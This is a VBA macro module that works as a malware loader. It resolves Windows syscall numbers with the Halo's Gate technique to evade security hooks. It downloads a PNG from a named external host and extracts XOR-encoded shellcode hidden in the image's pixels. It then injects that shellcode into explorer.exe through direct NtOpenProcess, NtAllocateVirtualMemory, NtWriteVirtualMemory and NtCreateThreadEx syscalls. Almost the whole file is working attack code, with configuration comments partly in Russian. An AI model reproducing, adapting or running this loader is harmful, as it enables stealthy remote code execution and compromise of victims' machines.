Option Explicit

' --- Windows API / NTSTATUS Constants ---
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const PROCESS_ALL_ACCESS As Long = &H1FFFFF
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000

' --- API Declarations ---
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Function DispCallFunc Lib "oleaut32" (ByVal pvInstance As LongPtr, ByVal oVft As LongPtr, ByVal cc As Long, ByVal vtReturn As Integer, ByVal cActuals As Long, ByRef prgvt As Integer, ByRef prgpvarg As LongPtr, ByRef pvargResult As Variant) As Long

' Dynamic SSN
Private Declare PtrSafe Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
    
' DELETE: debug for thread ID
Private Declare PtrSafe Function GetThreadId Lib "kernel32" (ByVal Thread As LongPtr) As Long

' Structure for NtOpenProcess
Private Type OBJECT_ATTRIBUTES
    Length As Long
    RootDirectory As LongPtr
    ObjectName As LongPtr
    Attributes As Long
    SecurityDescriptor As LongPtr
    SecurityQualityOfService As LongPtr
End Type

Private Type CLIENT_ID
    UniqueProcess As LongPtr
    UniqueThread As LongPtr
End Type

Private Type PS_ATTRIBUTE
    Attribute As LongPtr
    Size As LongPtr
    Value As LongPtr
    ReturnLength As LongPtr
End Type

Private Type PS_ATTRIBUTE_LIST
    TotalLength As LongPtr
    Attributes(0 To 0) As PS_ATTRIBUTE ' Only 1 attribute (null entry)
End Type

Private Type UNICODE_STRING
    Length As Integer
    MaximumLength As Integer
    Buffer As LongPtr
End Type

Private Type SYSTEM_PROCESS_INFORMATION
    NextEntryOffset As Long
    NumberOfThreads As Long
    WorkingSetPrivateSize As LongLong
    HardFaultCount As Long
    NumberOfThreadsHighWatermark As Long
    CycleTime As LongLong
    CreateTime As LongLong
    UserTime As LongLong
    KernelTime As LongLong
    ImageName As UNICODE_STRING
    BasePriority As Long
    UniqueProcessId As LongPtr
    ' ... followed by other fields we can skip via offset
End Type

' Get SSN Halo's Gate
Function GetSyscallNumber(ByVal FunctionName As String) As Long
    Dim pFunc As LongPtr
    Dim opcode As Byte
    Dim ssn As Long
    Dim offset As Long
    Dim i As Long
    
    pFunc = GetProcAddress(GetModuleHandle("ntdll.dll"), FunctionName)
    If pFunc = 0 Then
        GetSyscallNumber = -1
        Exit Function
    End If
    
    ' 1. Check if the primary function is clean (0xB8 at offset +3)
    CopyMemory opcode, ByVal (pFunc + 3), 1
    If opcode = &HB8 Then
        CopyMemory ssn, ByVal (pFunc + 4), 4
        GetSyscallNumber = ssn
        Exit Function
    End If
    
    ' 2. Primary is hooked! Let's search neighbors (Halo's Gate strategy)
    ' In x64 ntdll, standard stubs are 32 bytes (0x20) apart.
    Debug.Print "Warning: " & FunctionName & " is hooked. Searching neighbors..."
    
    For i = 1 To 20 ' Check up to 20 neighbors in both directions
        ' Search Downwards (Higher memory address = Higher SSN)
        Dim pDown As LongPtr: pDown = pFunc + (i * &H20)
        CopyMemory opcode, ByVal (pDown + 3), 1
        If opcode = &HB8 Then
            CopyMemory ssn, ByVal (pDown + 4), 4
            GetSyscallNumber = ssn - i ' Subtract the distance to get original SSN
            Debug.Print "Success: Resolved SSN via downstream neighbor: " & GetSyscallNumber
            Exit Function
        End If
        
        ' Search Upwards (Lower memory address = Lower SSN)
        Dim pUp As LongPtr: pUp = pFunc - (i * &H20)
        CopyMemory opcode, ByVal (pUp + 3), 1
        If opcode = &HB8 Then
            CopyMemory ssn, ByVal (pUp + 4), 4
            GetSyscallNumber = ssn + i ' Add the distance to get original SSN
            Debug.Print "Success: Resolved SSN via upstream neighbor: " & GetSyscallNumber
            Exit Function
        End If
    Next i
    
    ' If we get here, the hook configuration is wider than our search scope
    GetSyscallNumber = -1
End Function

' --- Core Syscall Execution ---
' This stub moves the first 4 args into registers, then triggers the syscall
' Assembly: mov r10, rcx; mov eax, [SSN]; syscall; ret
Private Function ExecuteSyscall(ByVal ssn As Long, ByRef args() As Variant) As Long
    Dim shellcode() As Byte
    Dim ssnHex As String
    Dim flOld As Long
    Dim vRet As Variant
    
    ' Prepare SSN
    ssnHex = Right("00000000" & Hex(ssn), 8)
    ssnHex = Mid(ssnHex, 7, 2) & Mid(ssnHex, 5, 2) & Mid(ssnHex, 3, 2) & Mid(ssnHex, 1, 2)
    
    ' This stub is more robust for 4+ arguments
    ' mov r10, rcx; mov eax, SSN; syscall; ret
    shellcode = HexToBytes("4C8BD1B8" & ssnHex & "0F05C3")
    VirtualProtect shellcode(0), UBound(shellcode) + 1, PAGE_EXECUTE_READWRITE, flOld

    Dim vTypes() As Integer: ReDim vTypes(UBound(args))
    Dim vPtrs() As LongPtr: ReDim vPtrs(UBound(args))
    Dim i As Integer
    
    For i = 0 To UBound(args)
        ' Force every single argument to be treated as an 8-byte LongLong (Type 20)
        ' This is the only way to guarantee DispCallFunc doesn't truncate
        ' a 0 or a small handle into 4 bytes.
        vTypes(i) = 20 ' vbLongLong
        vPtrs(i) = VarPtr(args(i))
    Next i

    ' Use CC_STDCALL (4) which DispCallFunc uses to handle x64 registers
    DispCallFunc 0, VarPtr(shellcode(0)), 4, vbLong, UBound(args) + 1, vTypes(0), vPtrs(0), vRet
    ExecuteSyscall = vRet
End Function

' --- Implementation Wrappers ---

Public Function Syscall_NtAllocateVirtualMemory(ByVal hProcess As LongPtr, ByRef baseAddr As LongPtr, ByVal Size As LongPtr) As Long
    Dim args(0 To 5) As Variant
    Dim regionSize As LongPtr: regionSize = Size
    
    ' Arguments: (ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
    args(0) = hProcess
    args(1) = VarPtr(baseAddr)
    args(2) = 0&                     ' ZeroBits (Using 0 instead of 0Ptr)
    args(3) = VarPtr(regionSize)
    args(4) = MEM_COMMIT Or MEM_RESERVE
    args(5) = PAGE_EXECUTE_READWRITE
    
    ' SSN 0x18
    Syscall_NtAllocateVirtualMemory = ExecuteSyscall(GetSyscallNumber("NtAllocateVirtualMemory"), args)
End Function

Public Sub Syscall_NtClose(ByVal hObject As LongPtr)
    Dim args(0 To 0) As Variant
    Dim status As Long
    
    ' Validate handle before attempting to close
    If hObject = 0 Then
        Debug.Print "[!] NtClose: Received a NULL handle. Skipping."
        Exit Sub
    End If
    
    args(0) = hObject
    
    ' Execute NtClose (SSN 0x0F)
    status = ExecuteSyscall(GetSyscallNumber("NtClose"), args)
    
    If status = 0 Then
        Debug.Print "Success: closed handle 0x" & Hex(hObject)
    Else
        ' Common error: 0xC0000008 (STATUS_INVALID_HANDLE)
        Debug.Print "Error: Failed to close handle 0x" & Hex(hObject) & " | NTSTATUS: 0x" & Hex(status)
    End If
End Sub

Public Function Syscall_NtOpenProcess(ByVal PID As Long) As LongPtr
    Dim hProc As LongPtr
    Dim oa As OBJECT_ATTRIBUTES
    Dim cid As CLIENT_ID
    Dim args(0 To 3) As Variant
    
    oa.Length = LenB(oa)
    cid.UniqueProcess = PID
    
    args(0) = VarPtr(hProc)
    args(1) = PROCESS_ALL_ACCESS
    args(2) = VarPtr(oa)
    args(3) = VarPtr(cid)
    
    ' SSN 0x26
    If ExecuteSyscall(GetSyscallNumber("NtOpenProcess"), args) = 0 Then Syscall_NtOpenProcess = hProc
End Function

Public Function Syscall_NtWriteVirtualMemory(ByVal hProcess As LongPtr, ByVal baseAddr As LongPtr, ByVal bufferAddr As LongPtr, ByVal Size As LongPtr) As Long
    Dim bytesWritten As LongPtr
    Dim args(0 To 4) As Variant
    
    args(0) = hProcess
    args(1) = baseAddr
    args(2) = bufferAddr
    args(3) = Size
    args(4) = VarPtr(bytesWritten)
    
    ' SSN 0x3A
    Syscall_NtWriteVirtualMemory = ExecuteSyscall(GetSyscallNumber("NtWriteVirtualMemory"), args)
End Function

' Update the wrapper to try the new Win11 SSNs
Public Function Syscall_NtCreateThreadEx(ByVal hProcess As LongPtr, ByVal startAddr As LongPtr, ByVal paramAddr As LongPtr) As LongPtr
    Dim hThread As LongPtr
    Dim status As Long
    Dim args(0 To 10) As Variant
    
    ' Standard Arguments
    args(0) = VarPtr(hThread)
    args(1) = &H1FFFFF                 ' THREAD_ALL_ACCESS
    args(2) = CLngPtr(0)               ' ObjectAttributes
    args(3) = hProcess                 ' ProcessHandle

    ' Stack Arguments
    args(4) = CLngPtr(startAddr)
    args(5) = CLngPtr(paramAddr)
    args(6) = CLngPtr(0)               ' CreateFlags
    args(7) = CLngPtr(0)               ' ZeroBits
    args(8) = CLngPtr(0)               ' StackSize
    args(9) = CLngPtr(0)               ' MaxStackSize
    args(10) = CLngPtr(0)              ' AttributeList

    ' Try SSN 0xC9 (Modern Win11 23H2/24H2)
    status = ExecuteSyscall(GetSyscallNumber("NtCreateThreadEx"), args)

    If status = 0 Then
        Syscall_NtCreateThreadEx = hThread
    Else
        Debug.Print "Error: NtCreateThreadEx Failure: 0x" & Hex(status)
    End If
End Function

' --- Helper ---
Private Function HexToBytes(ByVal hexStr As String) As Byte()
    Dim b() As Byte, i As Long
    ReDim b(Len(hexStr) / 2 - 1)
    For i = 0 To UBound(b): b(i) = CByte("&H" & Mid(hexStr, i * 2 + 1, 2)): Next i
    HexToBytes = b
End Function

Function GetPID(ByVal processName As String) As Long
    Dim objWMIService As Object
    Dim colProcessList As Object
    Dim objProcess As Object
    
    ' Set default return value to 0 (not found)
    GetPID = 0
    
    ' Connect to WMI
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    
    ' Query for processes matching the name
    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & processName & "'")
    
    ' Loop through matches (returns the first one found)
    For Each objProcess In colProcessList
        GetPID = objProcess.ProcessId
        Exit For
    Next objProcess
    
    ' Clean up
    Set colProcessList = Nothing
    Set objWMIService = Nothing
End Function

Function DownloadFile(URL As String, LocalPath As String) As Boolean
    Dim WinHttpReq As Object
    On Error Resume Next
    
    ' Initialize XMLHTTP object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.Send
    
    ' Check if request was successful
    If WinHttpReq.status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' adTypeBinary
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile LocalPath, 2 ' adSaveCreateOverWrite
        oStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function

Function DownloadAndExtract() As Byte()

    Dim imgURL As String
    Dim tempPath As String
    Dim xorKey As Byte
    Dim offsetPixels As Long
    
    ' --- CONFIGURATION ---
    ' Make sure these match your Python script settings
    imgURL = "https://soulinkkk1.pythonanywhere.com/images/pig.png" ' Direct link to your PNG
    tempPath = Environ("TEMP") & "\downloaded_payload.png"
    xorKey = &H77
    offsetPixels = 20
    ' ---------------------
    
    ' 1. Download the image
    If Not DownloadFile(imgURL, tempPath) Then
        MsgBox "Error: Could not download file from the provided URL!", vbCritical
        Exit Function
    End If
    
    Dim img As Object, px As Object
    Set img = CreateObject("WIA.ImageFile")
    img.LoadFile tempPath
    Set px = img.ARGBData
    
    Dim bitBuffer As Long, bitCount As Integer, byteCount As Long
    Dim totalTargetBytes As Long: totalTargetBytes = 4 ' Сначала ищем длину
    Dim shellcode() As Byte: ReDim shellcode(3)
    Dim lengthFound As Boolean: lengthFound = False
    
    Dim i As Long, c As Integer, pixelVal As Long, rgb(2) As Byte
    
    ' Основной цикл по пикселям после отступа
    For i = offsetPixels + 1 To px.Count
    pixelVal = px.Item(i)
    
    ' Извлекаем байты без ошибок переполнения
    ' Используем маски, чтобы получить чистые значения 0-255
    rgb(0) = CByte(((pixelVal And &HFF0000) \ &H10000) And &HFF)
    rgb(1) = CByte(((pixelVal And &HFF00) \ &H100) And &HFF)
    rgb(2) = CByte(pixelVal And &HFF)
    
    ' ВНИМАНИЕ: Python PIL (RGB) -> VBA WIA (ARGB)
    ' Если данные не читаются, попробуйте поменять цикл на: For c = 2 To 0 Step -1
    For c = 0 To 2
        If (rgb(c) And 1) = 1 Then
            bitBuffer = bitBuffer Or (2 ^ bitCount)
        End If
        bitCount = bitCount + 1
        
        If bitCount = 8 Then
            ' Расшифровываем байт
            Dim decodedByte As Byte
            decodedByte = CByte(bitBuffer Xor xorKey)
            
            ' Сохраняем в массив
            shellcode(byteCount) = decodedByte
            byteCount = byteCount + 1
            
            ' Сбрасываем буфер
            bitBuffer = 0
            bitCount = 0
            
            ' Проверка длины после первых 4 байт
            If byteCount = 4 And lengthFound = False Then
                totalTargetBytes = CLng(CDbl(shellcode(0)) + _
                                        CDbl(shellcode(1)) * 256# + _
                                        CDbl(shellcode(2)) * 65536# + _
                                        CDbl(shellcode(3)) * 16777216#)
                
                If totalTargetBytes > 0 And totalTargetBytes < 1000000 Then
                    ReDim Preserve shellcode(totalTargetBytes + 3)
                    lengthFound = True
                Else
                    MsgBox "Ошибка: Неверная длина (" & totalTargetBytes & ")", vbCritical
                    Exit Function
                End If
            End If
            
            ' Если вытащили всё
            If lengthFound And byteCount = totalTargetBytes + 4 Then GoTo SuccessDownloadAndExtract
        End If
    Next c
Next i
    
SuccessDownloadAndExtract:

    Dim cleanData() As Byte
    ReDim cleanData(totalTargetBytes - 1)
        
    Dim k As Long
    For k = 0 To totalTargetBytes - 1
        cleanData(k) = shellcode(k + 4)
    Next k
        
    Kill tempPath
    
    DownloadAndExtract = cleanData
    
End Function

Public Sub TestInjection()
    Dim targetPID As Long
    Dim hProcess As LongPtr
    Dim remoteMem As LongPtr
    Dim hThread As LongPtr
    Dim status As Long
    Dim shellcode() As Byte
    Dim shellcodeSize As LongPtr
        
    ' 1. Define your target PID (e.g., a running instance of notepad.exe)
    targetPID = GetPID("explorer.exe")
    If targetPID = 0 Then Exit Sub

    ' 2. Define the payload (Example: simple x64 NOP sled + return)
    ' Replace this with your actual x64 shellcode
    shellcode = DownloadAndExtract()
    shellcodeSize = UBound(shellcode) + 1
    
    ' Visual test part
    ' Dim finalResultString As String
    ' Dim finalResultHex As String
    ' Dim k As Long
    
    ' For k = 0 To UBound(shellcode)
    '     finalResultString = finalResultString & Chr(shellcode(k))
    '     finalResultHex = finalResultHex & Right("0" & Hex(shellcode(k)), 2) & " "
    ' Next k
    '
    ' With Sheets(1)
    '     .Range("A1").Value = finalResultString
    '     .Range("A2").Value = finalResultHex
    '     .Columns("A").AutoFit
    '
    ' End With
    ' Visual test part

    ' 3. Open the Process via Syscall (NtOpenProcess)
    hProcess = Syscall_NtOpenProcess(targetPID)
    
    If hProcess = 0 Then
        MsgBox "Failed to open process. Check if PID is valid and permissions are sufficient.", vbCritical
        Exit Sub
    End If
    Debug.Print "Success: Process Handle = " & hProcess

    ' 4. Allocate Memory in Target via Syscall (NtAllocateVirtualMemory)
    ' remoteMem starts as 0, the kernel will update it with the allocated address
    remoteMem = 0
    status = Syscall_NtAllocateVirtualMemory(hProcess, remoteMem, shellcodeSize)
    
    If status <> 0 Or remoteMem = 0 Then
        MsgBox "Failed to allocate memory. NTSTATUS: 0x" & Hex(status), vbCritical
        GoTo Cleanup
    End If
    Debug.Print "Success: Memory allocated at 0x" & Hex(remoteMem)

    ' 5. Write Shellcode to Target via Syscall (NtWriteVirtualMemory)
    status = Syscall_NtWriteVirtualMemory(hProcess, remoteMem, VarPtr(shellcode(0)), shellcodeSize)
    
    If status <> 0 Then
        MsgBox "Failed to write memory. NTSTATUS: 0x" & Hex(status), vbCritical
        GoTo Cleanup
    End If
    Debug.Print "Success: Shellcode written to target."

    ' 6. Execute Shellcode via Syscall (NtCreateThreadEx)
    hThread = Syscall_NtCreateThreadEx(hProcess, remoteMem, 0)
    
    If hThread <> 0 Then
        Dim threadID As Long
        threadID = GetThreadId(hThread)
        
        Debug.Print "Success: Thread created successfully!"
        Debug.Print "Success: Thread Handle: 0x" & Hex(hThread)
        Debug.Print "Success: Thread ID:     " & threadID
        
        ' Clean up the handle (the thread continues to run)
        Syscall_NtClose hThread
    Else
        Debug.Print "[!] CRITICAL: Failed to create remote thread."
        ' The specific NTSTATUS error is already printed by Syscall_NtCreateThreadEx
    End If

Cleanup:
    ' Final Cleanup: Close the process handle
    Syscall_NtClose hProcess
    Debug.Print "Success: Injection workflow and cleanup complete."
End Sub
